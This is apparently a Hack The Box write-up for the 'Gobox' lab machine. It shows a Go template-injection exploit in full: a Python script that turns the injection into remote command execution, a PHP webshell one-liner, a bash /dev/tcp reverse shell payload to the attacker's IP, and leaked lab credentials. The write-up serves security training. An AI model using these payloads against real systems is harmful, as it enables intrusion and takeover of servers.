# # `Enumeration` -

![[Pasted image 20210904092516.png]]

Capturing the login request using Burp -

![[Pasted image 20210904111511.png]]

The `X-Forwarded-Server` header is not a [standard HTTP header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers). It’s specifically calling out that this server is written in Go.

# # `Directory Listing` -
```bash
root@napster:~/Documents/HTB/Gobox# feroxbuster -u http://10.10.11.113:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft
-small-words.txt -x php -o directory_8080.txt                                                                                           
                                                                                                                                        
 ___  ___  __   __     __      __         __   ___                                                                                      
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                       
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                      
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.113:8080/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ directory_8080.txt
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
WLD       54l      109w     1752c Got 200 for http://10.10.11.113:8080/64b60c610ab74950bed14746933a6884 (url length: 32)
WLD         -         -         - Wildcard response is static; auto-filtering 1752 responses; toggle this behavior by using --dont-filter
WLD       54l      109w     1752c Got 200 for http://10.10.11.113:8080/197780bd4234409d9dfc1bcfffa448e762d05833357e4b0f812c611281940cc3$bbcd40a667b4277932b1b6fec0da14e (url length: 96)
301        2l        3w       43c http://10.10.11.113:8080/forgot
WLD       50l       93w     1482c Got 200 for http://10.10.11.113:8080/forgot/5b24ea964957484b8ec5d136fe4a10cc (url length: 32)
WLD         -         -         - Wildcard response is static; auto-filtering 1482 responses; toggle this behavior by using --dont-filter
WLD       50l       93w     1482c Got 200 for http://10.10.11.113:8080/forgot/36e04689203046a381dc705385683eae9f475f9f63cf458a828513b074d0c376f3d625938fcc43e3ba51024a8f60f904 (url length: 96)
[####################] - 7m    258024/258024  0s      found:5       errors:0      
[####################] - 7m     86010/86008   197/s   http://10.10.11.113:8080/
[####################] - 7m     86010/86008   196/s   http://10.10.11.113:8080/forgot
[####################] - 7m     86008/86008   196/s   http://10.10.11.113:8080/forgot/
```

We got a forgot page. 

# # `SSTI` -

The web page title was a hint for SSTi and with further knowledge that server is using Go(Golang).I searched for SSTI in golang.
[This post](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html) does a nice job talking about how to start looking for SSTI in Go.

# # `Exploitation` -

With the knowledge from above we gonna try to see if it works,we tried the injection on /forgot page-

![[Pasted image 20210904115031.png]]

We got creds :

User-ippsec@hacking.esports
Pass-ippsSecretPassword

We used the bove creds to login -

![[Pasted image 20210904115248.png]]

# # `Source Code` -

What we get to see after login is perhaps the source code of the site -

![[Pasted image 20210904115429.png]]

Code :

```bash
package main

import(
    "html/template"
    "net/http"
    "log"
    "os/exec"
    "fmt"
    "bytes"
    "strings"
)

// compile all templates and cache them
var templates = template.Must(template.ParseGlob("templates/*"))

type Data struct {
    Title string // Must be exported!
    Body string  // Must be exported!
}

type User struct {
        ID       int
        Email    string
        Password string
}


func (u User) DebugCmd (test string) string {
  ipp := strings.Split(test, " ")
  bin := strings.Join(ipp[:1], " ")
  args := strings.Join(ipp[1:], " ")
  if len(args) > 0{
    out, _ := exec.Command(bin, args).CombinedOutput()
    return string(out)
  } else {
    out, _ := exec.Command(bin).CombinedOutput()
    return string(out)
  }
}

// Renders the templates
func renderTemplate(w http.ResponseWriter, tmpl string, page *Data) {
	err := templates.ExecuteTemplate(w, tmpl, page)
	if err != nil {
    http.Error(w, err.Error(), http.StatusInternalServerError)
    return
	}
}

func IndexHandler(w http.ResponseWriter, r *http.Request) {
  switch r.Method {
  case "GET":
	page := &Data{Title:"Home page", Body:"Welcome to our brand new home page."}
	renderTemplate(w, "index", page)
  case "POST":
	page := &Data{Title:"Home page", Body:"Welcome to our brand new home page."}
    if r.FormValue("password") == "ippsSecretPassword" {
      renderTemplate(w, "source", page )
    } else {
      renderTemplate(w, "index", page)
    }
  }
}

func ForgotHandler(w http.ResponseWriter, r *http.Request) {
    switch r.Method {
    case "GET":
      page := &Data{Title:"Forgot Password", Body:""}
      renderTemplate(w, "forgot", page)
    case "POST":
      var user1 = &User{1, "ippsec@hacking.esports", "ippsSecretPassword"}
      var tmpl = fmt.Sprintf(`Email Sent To: %s`, r.FormValue("email"))

      t, err := template.New("page").Parse(tmpl)
      if err != nil {
          fmt.Println(err)
      }

      var tpl bytes.Buffer
      t.Execute(&tpl, &user1)
      page := &Data{Title:"Forgot Password", Body:tpl.String()}
      renderTemplate(w, "forgot", page)
    }
}


func main(){
  http.HandleFunc("/", IndexHandler)
  http.HandleFunc("/forgot/", ForgotHandler)
  log.Fatal(http.ListenAndServe(":80", nil))
}
```

We can see an interseting function `DebugCmd` -

```bash
func (u User) DebugCmd (test string) string {
  ipp := strings.Split(test, " ")
  bin := strings.Join(ipp[:1], " ")
  args := strings.Join(ipp[1:], " ")
  if len(args) > 0{
    out, _ := exec.Command(bin, args).CombinedOutput()
    return string(out)
  } else {
    out, _ := exec.Command(bin).CombinedOutput()
    return string(out)
  }
}
```

# # `Exploitation` -

In the SSTI above, I used `{{ . }}` to print the current objects passed into the template. I can also reference functions from the code within `{{ }}`. [This post](https://www.calhoun.io/intro-to-templates-p3-functions/) talks about how to reference objects (including functions) from the templating engine using a `.function_name`. Submitting `{{ .DebugCmd "id" }}` returns proof of execution:

![[Pasted image 20210904120109.png]]


# # `Psuedo Terminal` -

```bash
#!/usr/bin/env python3    

import re    
import requests    
from cmd import Cmd    
from html import unescape    


class Term(Cmd):    
    prompt = "gobox> "    
    capture_re = re.compile(r"Email Sent To: (.*?)\s+<button class", re.DOTALL)    

    def default(self, args):    
        """Run given input as command on gobox"""    
        cmd = args.replace('"', '\\"')    
        resp = requests.post('http://10.10.11.113:8080/forgot/',    
                data = {"email": f'{{{{ .DebugCmd "{cmd}" }}}}'},    
                proxies = {"http": "http://127.0.0.1:8080"})    
        try:    
            result = self.capture_re.search(resp.text).group(1)    
            result = unescape(unescape(result))
            print(result)
        except:
            import pdb; pdb.set_trace()


    def do_exit(self, args):
        """Exit"""
        return True


term = Term()
term.cmdloop()
```

On further enumeration we found out that it has aws installed -

![[Pasted image 20210904123655.png]]

# # `Enumerating aws` -

![[Pasted image 20210904123824.png]]

We found a single bucket names `website`

![[Pasted image 20210904124052.png]]

# # `Webshell` -

We can upload a php webshell to the server -

```bash
root@napster:~/Documents/HTB/Gobox# echo '<?php system($_REQUEST["nap"]); ?>'
<?php system($_REQUEST["nap"]); ?>
root@napster:~/Documents/HTB/Gobox# echo '<?php system($_REQUEST["nap"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsibmFwIl0pOyA/Pgo=
```

Now Upload it to the server -

![[Pasted image 20210904130208.png]]


![[Pasted image 20210904130414.png]]

![[Pasted image 20210904130558.png]]


# # `Reverse Shell` -

Payload - `bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.58/9001+0>%261'`

![[Pasted image 20210904131223.png]]


```bash
root@napster:~/Documents/HTB/Gobox# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.58] from (UNKNOWN) [10.10.11.113] 48338
bash: cannot set terminal process group (838): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gobox:/opt/website$  ls -la
total 1460
drwxr-xr-x 3 www-data www-data    4096 Sep  4 17:03 .
drwxr-xr-x 5 root     root        4096 Aug 24 14:52 ..
-rw-r--r-- 1 www-data www-data 1294778 Aug 24 15:20 bottom.png
drwxr-xr-x 2 www-data www-data    4096 Aug 26 21:26 css
-rw-r--r-- 1 www-data www-data  165551 Aug 24 15:20 header.png
-rw-r--r-- 1 root     root           5 Aug 24 17:17 index.html
-rwxr-xr-x 1 www-data www-data    1803 Aug 24 15:20 index.php
-rw-r--r-- 1 root     root          35 Sep  4 17:03 nap.php
-rw-r--r-- 1 root     root        1111 Sep  4 14:04 shell.php
```

# # `User` -

```bash
www-data@gobox:/opt/website$ cd /home/
www-data@gobox:/home$ ls -la
total 12
drwxr-xr-x  3 root   root   4096 Aug 26 21:26 .
drwxr-xr-x 19 root   root   4096 Aug 26 21:30 ..
drwxrwxrwx  5 ubuntu ubuntu 4096 Aug 26 21:31 ubuntu
www-data@gobox:/home$ cd ubuntu/
www-data@gobox:/home/ubuntu$ ls -la
total 60
drwxrwxrwx 5 ubuntu ubuntu  4096 Aug 26 21:31 .
drwxr-xr-x 3 root   root    4096 Aug 26 21:26 ..
lrwxrwxrwx 1 root   root       9 Aug 24 19:25 .bash_history -> /dev/null
-rw-r--r-- 1 ubuntu ubuntu   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu  3771 Feb 25  2020 .bashrc
drwx------ 3 ubuntu ubuntu  4096 Aug 26 21:26 .cache
drwx------ 4 ubuntu ubuntu  4096 Aug 26 21:26 .local
-rw-r--r-- 1 ubuntu ubuntu   807 Feb 25  2020 .profile
-rw-r--r-- 1 ubuntu ubuntu     0 Aug 23 12:39 .sudo_as_admin_successful
drwxr-xr-x 2 ubuntu ubuntu  4096 Aug 26 21:26 .vim
-rw------- 1 ubuntu ubuntu 21202 Aug 24 13:05 .viminfo
-rw-r--r-- 1 root   root      33 Aug 26 21:10 user.txt
www-data@gobox:/home/ubuntu$ cat user.txt 
d6b916265fd4a984d17db028a3a729f0
```